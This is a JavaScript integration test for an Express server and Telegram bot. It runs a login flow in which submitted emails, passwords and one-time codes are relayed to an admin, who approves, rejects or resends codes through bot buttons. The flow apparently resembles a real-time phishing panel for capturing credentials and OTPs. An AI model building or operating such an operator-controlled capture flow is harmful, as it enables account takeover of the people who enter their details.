// Set dummy env variables first to force Mock mode and select test port
process.env.PORT = 5050;
process.env.BOT_TOKEN = 'your_telegram_bot_token';
process.env.ADMIN_CHAT_ID = 'your_personal_telegram_chat_id';

// Import dependencies for checking
const bot = require('./bot');
const otpStore = require('./otpStore');

// Start server
require('./index');

const baseUrl = 'http://localhost:5050';

async function runTests() {
  console.log('🚀 Starting new real-time Telegram integration flow tests...');

  try {
    const email = 'test_realtime@example.com';
    const password = 'password123';

    // ----------------------------------------------------
    // Test 1: POST /api/login (User signs in)
    // ----------------------------------------------------
    console.log('\n--- Test 1: User Login Submission (POST /api/login) ---');
    const loginRes = await fetch(`${baseUrl}/api/login`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, password })
    });
    const loginData = await loginRes.json();
    console.log('Response:', loginData);
    if (!loginData.success) {
      throw new Error('Test 1 failed: Login request was not successful');
    }

    const session = otpStore[email];
    if (!session || session.status !== 'login_submitted') {
      throw new Error(`Test 1 failed: Session should be initialized to login_submitted. Found: ${session ? session.status : 'None'}`);
    }
    console.log('Session Initialized:', session);

    // ----------------------------------------------------
    // Test 2: GET /api/session-status (Client Polling)
    // ----------------------------------------------------
    console.log('\n--- Test 2: Polling Session Status (GET /api/session-status) ---');
    const pollRes1 = await fetch(`${baseUrl}/api/session-status?email=${encodeURIComponent(email)}`);
    const pollData1 = await pollRes1.json();
    console.log('Response:', pollData1);
    if (!pollData1.success || pollData1.status !== 'login_submitted') {
      throw new Error(`Test 2 failed: Expected status login_submitted, got: ${pollData1.status}`);
    }

    // ----------------------------------------------------
    // Test 3: Admin clicks "POP OTP" button (Callback pop_otp)
    // ----------------------------------------------------
    console.log('\n--- Test 3: Admin taps "POP OTP" (Trigger Callback pop_otp) ---');
    if (typeof bot._callbackQueryHandler !== 'function') {
      throw new Error('Test 3 failed: Bot callback query handler is not registered');
    }

    await bot._callbackQueryHandler({
      id: 'query_pop_otp',
      data: `pop_otp:${email}`,
      message: {
        chat: { id: 123456 },
        message_id: 1111
      }
    });

    const sessionAfterPop = otpStore[email];
    if (!sessionAfterPop || sessionAfterPop.status !== 'show_otp' || !sessionAfterPop.otp) {
      throw new Error(`Test 3 failed: Status should be show_otp and OTP generated. Status: ${sessionAfterPop ? sessionAfterPop.status : 'None'}`);
    }
    console.log('Session after POP OTP:', sessionAfterPop);
    const initialOtp = sessionAfterPop.otp;

    // ----------------------------------------------------
    // Test 4: Polling returns show_otp and the generated OTP code
    // ----------------------------------------------------
    console.log('\n--- Test 4: Polling Session Status (GET /api/session-status) ---');
    const pollRes2 = await fetch(`${baseUrl}/api/session-status?email=${encodeURIComponent(email)}`);
    const pollData2 = await pollRes2.json();
    console.log('Response:', pollData2);
    if (!pollData2.success || pollData2.status !== 'show_otp' || pollData2.otp !== initialOtp) {
      throw new Error(`Test 4 failed: Expected show_otp with otp ${initialOtp}`);
    }

    // ----------------------------------------------------
    // Test 5: User submits incorrect OTP (POST /api/submit-otp)
    // ----------------------------------------------------
    console.log('\n--- Test 5: User Submits Incorrect OTP (POST /api/submit-otp) ---');
    const wrongOtp = '000000';
    const submitWrongRes = await fetch(`${baseUrl}/api/submit-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, otp: wrongOtp })
    });
    const submitWrongData = await submitWrongRes.json();
    console.log('Response:', submitWrongData);
    if (!submitWrongData.success) {
      throw new Error('Test 5 failed: OTP submission rejected');
    }

    const sessionAfterWrongSubmit = otpStore[email];
    if (sessionAfterWrongSubmit.status !== 'otp_submitted' || sessionAfterWrongSubmit.otpEntered !== wrongOtp) {
      throw new Error(`Test 5 failed: Session status should be otp_submitted with entered OTP. Found: ${sessionAfterWrongSubmit.status}`);
    }
    console.log('Session state:', sessionAfterWrongSubmit);

    // ----------------------------------------------------
    // Test 6: Admin marks OTP as wrong (Callback wrong_otp)
    // ----------------------------------------------------
    console.log('\n--- Test 6: Admin clicks "WRONG OTP" (Trigger Callback wrong_otp) ---');
    await bot._callbackQueryHandler({
      id: 'query_wrong_otp',
      data: `wrong_otp:${email}`,
      message: {
        chat: { id: 123456 },
        message_id: 2222
      }
    });

    const sessionAfterWrongClick = otpStore[email];
    if (sessionAfterWrongClick.status !== 'rejected') {
      throw new Error(`Test 6 failed: Session status should be rejected. Found: ${sessionAfterWrongClick.status}`);
    }
    console.log('Session state:', sessionAfterWrongClick);

    // ----------------------------------------------------
    // Test 7: Admin clicks "RESEND NEW OTP" (Callback resend_otp)
    // ----------------------------------------------------
    console.log('\n--- Test 7: Admin clicks "RESEND NEW OTP" (Trigger Callback resend_otp) ---');
    await bot._callbackQueryHandler({
      id: 'query_resend_otp',
      data: `resend_otp:${email}`,
      message: {
        chat: { id: 123456 },
        message_id: 3333
      }
    });

    const sessionAfterResend = otpStore[email];
    if (sessionAfterResend.status !== 'show_otp' || sessionAfterResend.otp === initialOtp) {
      throw new Error(`Test 7 failed: Session should be show_otp with new OTP. Status: ${sessionAfterResend.status}, OTP: ${sessionAfterResend.otp}`);
    }
    console.log('Session state after resend:', sessionAfterResend);
    const newOtp = sessionAfterResend.otp;

    // ----------------------------------------------------
    // Test 8: User submits correct OTP (POST /api/submit-otp)
    // ----------------------------------------------------
    console.log('\n--- Test 8: User Submits New Correct OTP (POST /api/submit-otp) ---');
    const submitCorrectRes = await fetch(`${baseUrl}/api/submit-otp`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email, otp: newOtp })
    });
    const submitCorrectData = await submitCorrectRes.json();
    console.log('Response:', submitCorrectData);
    if (!submitCorrectData.success) {
      throw new Error('Test 8 failed');
    }

    // ----------------------------------------------------
    // Test 9: Admin clicks "ACCEPT OTP" (Callback accept_otp)
    // ----------------------------------------------------
    console.log('\n--- Test 9: Admin clicks "ACCEPT OTP" (Trigger Callback accept_otp) ---');
    await bot._callbackQueryHandler({
      id: 'query_accept_otp',
      data: `accept_otp:${email}`,
      message: {
        chat: { id: 123456 },
        message_id: 4444
      }
    });

    const sessionAfterAccept = otpStore[email];
    if (sessionAfterAccept.status !== 'verified') {
      throw new Error(`Test 9 failed: Session should be verified immediately on accept. Found: ${sessionAfterAccept.status}`);
    }
    console.log('Session state after accept:', sessionAfterAccept);

    // ----------------------------------------------------
    // Test 10: Client clears session (POST /api/clear-session)
    // ----------------------------------------------------
    console.log('\n--- Test 10: Client clears session (POST /api/clear-session) ---');
    const clearRes = await fetch(`${baseUrl}/api/clear-session`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email })
    });
    const clearData = await clearRes.json();
    console.log('Response:', clearData);
    if (!clearData.success) {
      throw new Error('Test 10 failed: clear-session was not successful');
    }
    if (otpStore[email]) {
      throw new Error('Test 10 failed: Session should be completely deleted from otpStore');
    }
    console.log('Session successfully deleted.');

    // Re-create the session for subsequent resend & cancel tests
    otpStore[email] = {
      email,
      status: 'otp_submitted',
      otp: '123456',
      otpExpiry: Date.now() + 60000
    };

    // ----------------------------------------------------
    // Test 13: User clicks Resend button on client (POST /api/request-resend)
    // ----------------------------------------------------
    console.log('\n--- Test 13: User clicks Resend on client (POST /api/request-resend) ---');
    // Save current OTP code to check that it updates
    const preResendOtp = otpStore[email].otp;
    const resendReqRes = await fetch(`${baseUrl}/api/request-resend`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ email })
    });
    const resendReqData = await resendReqRes.json();
    console.log('Response:', resendReqData);
    if (!resendReqData.success) {
      throw new Error('Test 13 failed: request-resend was not successful');
    }
    const sessionAfterResendReq = otpStore[email];
    if (sessionAfterResendReq.status !== 'show_otp' || sessionAfterResendReq.otp === preResendOtp) {
      throw new Error(`Test 13 failed: Session status should be show_otp and OTP should have changed. Status: ${sessionAfterResendReq.status}, OTP: ${sessionAfterResendReq.otp}`);
    }
    console.log('New OTP in store after client-initiated resend:', sessionAfterResendReq.otp);

    // ----------------------------------------------------
    // Test 12: Admin clicks "CANCEL" (Callback cancel)
    // ----------------------------------------------------
    console.log('\n--- Test 12: Admin clicks "CANCEL" (Trigger Callback cancel) ---');
    await bot._callbackQueryHandler({
      id: 'query_cancel',
      data: `cancel:${email}`,
      message: {
        chat: { id: 123456 },
        message_id: 7777
      }
    });

    const sessionAfterCancel = otpStore[email];
    if (sessionAfterCancel.status !== 'cancelled') {
      throw new Error(`Test 12 failed: Session should be cancelled. Found: ${sessionAfterCancel.status}`);
    }
    console.log('Session state:', sessionAfterCancel);

    console.log('\n🎉 ALL REAL-TIME TELEGRAM INTEGRATION TESTS PASSED SUCCESSFULLY!');
    process.exit(0);
  } catch (error) {
    console.error('\n❌ TEST RUN FAILED:', error.stack);
    process.exit(1);
  }
}

// Give Express a split second to bind to port, then run tests
setTimeout(runTests, 500);
